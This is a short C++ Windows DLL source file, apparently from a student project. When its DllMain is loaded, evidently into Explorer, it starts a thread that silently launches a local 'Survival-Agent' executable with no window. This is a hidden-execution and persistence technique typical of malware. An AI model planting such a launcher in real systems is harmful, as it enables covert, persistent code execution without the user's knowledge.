#include <windows.h>
#include <string>

// Logic: Launch the agent in a separate thread so we don't block Explorer
DWORD WINAPI LaunchAgent(LPVOID lpParam) {
    // Path to your Survival Agent
    std::string agentPath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\agent.exe";
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Launch agent.exe hidden
    CreateProcessA(NULL, (char*)agentPath.c_str(), NULL, NULL, FALSE, 
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Optimization: Disable thread library calls for performance
        DisableThreadLibraryCalls(hinstDLL);
        
        // Start the agent launch in a new thread
        CreateThread(NULL, 0, LaunchAgent, NULL, 0, NULL);
    }
    return TRUE;
}